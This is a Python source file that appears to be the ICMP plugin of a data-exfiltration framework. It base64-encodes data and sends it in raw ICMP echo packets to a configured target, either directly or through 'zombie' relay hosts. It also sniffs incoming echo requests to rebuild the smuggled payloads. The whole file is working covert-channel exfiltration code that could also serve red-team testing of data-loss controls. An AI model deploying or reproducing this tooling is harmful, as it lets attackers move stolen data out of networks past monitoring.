import logging
import base64
import socket
from struct import pack
from random import choice

config = None
app_exfiltrate = None

# http://wiki.dreamrunner.org/public_html/Python/Python-Things.html
def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + \
                ord(source_string[count])
        sum = sum + thisVal
        #sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        #sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer
# end of copy-paste

def send_icmp(dst, data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        print "root power you must have !"
        sys.exit()
    ip_dst = socket.gethostbyname(dst)
    icmp_type = 8
    icmp_code = 0
    icmp_sum  = 0
    icmp_id   = 1
    icmp_seq  = 1
    icmp_hdr = pack('!BBHHH', icmp_type, icmp_code, icmp_sum, icmp_id, icmp_seq)
    icmp_sum = checksum(icmp_hdr + data)
    icmp_hdr = pack('!BBHHH', icmp_type, icmp_code, icmp_sum, icmp_id, icmp_seq)
    packet = icmp_hdr + data
    try:
        s.sendto(packet, (ip_dst, 0))
    except:
        pass
    s.close()

def send(data):
    targets = [config['target']] + config['zombies']
    data = base64.b64encode(data)
    target = choice(targets)
    app_exfiltrate.log_message(
        'info', "[icmp] Sending {0} bytes with ICMP packet to {1}".format(len(data), target))
    send_icmp(target, data)

def listen():
    app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
    # Filter for echo requests only to prevent capturing generated replies
    sniff(handler=analyze)

def sniff(handler):
    """ Sniffs packets and looks for icmp requests """
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.bind(('', 1))
    while True :
        try:
            data = sock.recv(65536)
            ip_ihl = ord(data[:1]) & 0x0f
            ip_hdr = data[:(ip_ihl)*4]
            icmp_data = data[(ip_ihl)*4:]
            icmp_type = icmp_data[:1]
            if icmp_type == '\x08':
                ip_src = socket.inet_ntoa(ip_hdr[-8:-4])
                ip_dst = socket.inet_ntoa(ip_hdr[-4:])
                payload = icmp_data[4:]
                handler(payload, ip_src, ip_dst)
        except:
            sock.close()

def analyze(payload, src, dst):
    try:
        app_exfiltrate.log_message(
            'info', "[icmp] Received ICMP packet from {0} to {1}".format(src, dst))
        app_exfiltrate.retrieve_data(base64.b64decode(payload))
    except:
        pass

def relay_icmp_packet(payload, src, dst):
    target = config['target']
    try:
        app_exfiltrate.log_message(
                'info', "[zombie] [icmp] Relaying icmp packet to {0}".format(target))
        send_icmp(target, payload)
    except:
        pass

def zombie():
    app_exfiltrate.log_message(
            'info', "[zombie] [icmp] Listening for icmp packets")
    sniff(handler=relay_icmp_packet)

class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate = app
        config = conf
        app.register_plugin('icmp', {'send': send, 'listen': listen, 'zombie': zombie})
